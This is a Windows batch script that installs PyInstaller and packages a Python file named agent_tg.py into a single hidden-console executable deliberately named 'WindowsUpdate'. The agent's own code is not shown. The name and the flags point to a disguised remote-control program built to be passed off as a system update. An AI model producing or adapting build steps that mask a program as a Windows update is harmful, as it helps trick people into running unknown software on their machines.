@echo off
echo Installing dependencies...
pip install pyinstaller requests

echo Building EXE...
pyinstaller --onefile --noconsole --name="WindowsUpdate" agent_tg.py

echo.
echo Done! EXE is in dist\WindowsUpdate.exe
pause
